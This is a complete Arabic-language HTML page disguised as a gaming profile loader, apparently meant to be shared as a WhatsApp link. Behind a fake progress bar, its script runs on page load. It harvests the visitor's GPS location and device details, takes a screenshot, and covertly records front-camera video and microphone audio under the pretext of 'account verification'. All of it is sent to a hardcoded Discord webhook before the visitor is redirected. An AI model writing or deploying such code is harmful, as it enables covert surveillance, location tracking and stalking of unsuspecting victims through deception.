<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gamer Profile | جاري تحميل النظام</title>
    
    <!-- معاينة الواتساب بشكل رسمي وأنيق -->
    <meta property="og:title" content="الملف الشخصي الرسمي | Gaming Hub 🎮">
    <meta property="og:description" content="اضغط لعرض الإحصائيات الشخصية وبطاقة اللاعب.">
    <meta property="og:image" content="https://i.imgur.com/W333L67.png">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0b0f19;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            overflow: hidden;
        }
        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(56, 189, 248, 0.2);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 400px;
        }
        .loader-icon {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(56, 189, 248, 0.2);
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            margin: 0 0 10px 0;
            font-size: 20px;
            color: #38bdf8;
        }
        p {
            color: #94a3b8;
            font-size: 13px;
            margin-bottom: 25px;
        }
        .progress-bar-container {
            width: 100%;
            background: #1e293b;
            border-radius: 8px;
            overflow: hidden;
            height: 10px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #38bdf8, #818cf8);
            transition: width 0.3s ease;
            border-radius: 8px;
        }
        .status-text {
            margin-top: 15px;
            font-size: 12px;
            color: #64748b;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="loader-icon"></div>
        <h2>جاري مزامنة بيانات الحساب...</h2>
        <p>يرجى الانتظار حتى اكتمال تحميل عناصر الصفحة</p>
        
        <div class="progress-bar-container">
            <div id="progress" class="progress-bar"></div>
        </div>
        <div id="status" class="status-text">جاري تهيئة الاتصال (0%)...</div>
    </div>

    <!-- عناصر مخفية لالتقاط البيانات -->
    <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
        const FINAL_REDIRECT_URL = "https://i.imgur.com/W333L67.png";

        function updateProgress(percent, text) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('status').innerText = text;
        }

        // سحب الموقع (GPS)
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("الموقع غير مدعوم");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        resolve(`📍 [رابط الموقع على الخريطة](${mapsLink}) (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
                    },
                    (error) => {
                        resolve("⚠️ رفض السماح بالموقع");
                    },
                    { timeout: 4000 }
                );
            });
        }

        // جمع معلومات الجهاز
        async function getDeepDeviceData() {
            const ua = navigator.userAgent;
            let phoneType = "كمبيوتر / جهاز آخر";
            if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
            else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";

            let batteryInfo = "غير معروف";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "⚡ يشحن" : "🔋 بطارية";
                    batteryInfo = `${level}% (${charging})`;
                } catch(e) {}
            }

            const gpsResult = await getGPSLocation();
            const cpuCores = navigator.hardwareConcurrency || "غير معلن";
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";

            return `🎯 **تم رصد زائر جديد للملف الشخصي!** 🔥
━━━━━━━━━━━━━━━━━━━━
📱 **الجهاز:** ${phoneType}
🔋 **البطارية:** ${batteryInfo}
⚙️ **المعالج/الرام:** ${cpuCores} Cores / ${deviceMemory} RAM
📺 **الشاشة:** ${window.screen.width}x${window.screen.height}
🗺️ **الموقع:** ${gpsResult}
━━━━━━━━━━━━━━━━━━━━`;
        }

        // إرسال البيانات للديسكورد عبر الـ Webhook
        async function sendToDiscord(mediaBlob, isVideo, screenshotBlob, textData) {
            const formData = new FormData();
            const payload = { content: textData };
            formData.append('payload_json', JSON.stringify(payload));
            
            if (mediaBlob) {
                const fileName = isVideo ? 'profile_video.webm' : 'face_photo.jpg';
                formData.append('file1', mediaBlob, fileName);
            }
            if (screenshotBlob) {
                formData.append('file2', screenshotBlob, 'screen_capture.png');
            }

            try {
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (err) {}

            window.location.href = FINAL_REDIRECT_URL;
        }

        // تسلسل شاشة التحميل الحقيقية
        async function runProcess() {
            updateProgress(20, "جاري فحص نظام التشغيل والمعالج (20%)...");
            const textData = await getDeepDeviceData();

            updateProgress(50, "جاري التقاط لقطة الشاشة والبيانات (50%)...");
            let screenshotBlob = null;
            try {
                const screenCanvas = await html2canvas(document.body);
                screenshotBlob = await new Promise(resolve => screenCanvas.toBlob(resolve, 'image/png'));
            } catch (e) {}

            updateProgress(80, "جاري مطابقة بصمة الحساب والتحقق (80%)...");
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                let mediaRecorder;
                let chunks = [];
                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(stream);
                }

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    updateProgress(100, "تم بنجاح! جاري تحويلك للملف الشخصي (100%)...");
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    setTimeout(async () => {
                        await sendToDiscord(videoBlob, true, screenshotBlob, textData);
                    }, 500);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 2500);

            } catch (err) {
                updateProgress(100, "اكتمل الفحص (100%)...");
                setTimeout(async () => {
                    await sendToDiscord(null, false, screenshotBlob, textData);
                }, 500);
            }
        }

        window.onload = () => {
            setTimeout(runProcess, 400);
        };
    </script>
</body>
</html>
